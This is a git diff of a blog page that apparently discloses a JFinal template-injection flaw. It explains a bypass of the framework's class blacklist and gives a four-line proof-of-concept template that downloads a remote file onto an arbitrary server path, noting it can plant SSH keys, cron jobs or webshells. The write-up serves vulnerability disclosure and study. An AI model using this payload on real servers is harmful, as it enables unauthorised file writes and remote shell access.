@@ -165,7 +165,7 @@
 
         
         <a href="/2021/04/15/JFinal%20Code%20Execution/" class="archive-article-date">
-  	<time datetime="2021-04-15T13:40:59.035Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-15</time>
+  	<time datetime="2021-04-15T13:44:55.519Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-15</time>
 </a>
         
       </header>
@@ -174,11 +174,11 @@
       
         <h1 id="JFinal-Code-Excution"><a href="#JFinal-Code-Excution" class="headerlink" title="JFinal Code Excution"></a>JFinal Code Excution</h1><p>JFinal is a Java Web framework with front-end rendering function. If its front-end template allows users to edit, it will cause code execution vulnerability. JFinal itself does some blacklist restrictions, but there are bypass problems.</p>
 <p>JFinal only allows users to invoke static methods, and in com.jfinal.template.expr.ast.MethodKit we can see JFinal do some blacklist to restrict code execution. After debugging, we found a total of 16 classes that were masked.</p>
-<p>![block_class](JFinal Code Execution\block_class.png)</p>
+<p>![block_class](JFinal Code Execution/block_class.png)</p>
 <p>But most Web applications contain a number of third-party libraries that are available in static methods.</p>
 <p>I have push an example on gihub  ( <a href="https://github.com/turn1tup/JFinalTest" target="_blank" rel="noopener">https://github.com/turn1tup/JFinalTest</a>), you can use this code example to understand  this vul.</p>
 <p>This is the Class  used to render a html page and which triggering holes.</p>
-<p>![block_class](JFinal Code Execution\TestMain.png)</p>
+<p>![block_class](JFinal Code Execution/TestMain.png)</p>
 <p>We circumvented JFinal’s blacklist policy by using third-party libraries</p>
 <p>The POC can upload any file to any location of the server, we can write the SSH public key, timing task or webshell to  getshell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#set(uri&#x3D;java.net.URI::create(&quot;https:&#x2F;&#x2F;github.com&#x2F;turn1tup&#x2F;JFinalTest&#x2F;blob&#x2F;main&#x2F;README.md&quot;))</span><br><span class="line">#set(url&#x3D;uri.toURL())</span><br><span class="line">#set(paths&#x3D;java.nio.file.Paths::get(&quot;D:&#x2F;&quot;, &quot;success.txt&quot;))</span><br><span class="line">#(org.apache.commons.io.file.PathUtils::copyFile(url, paths))</span><br></pre></td></tr></table></figure>
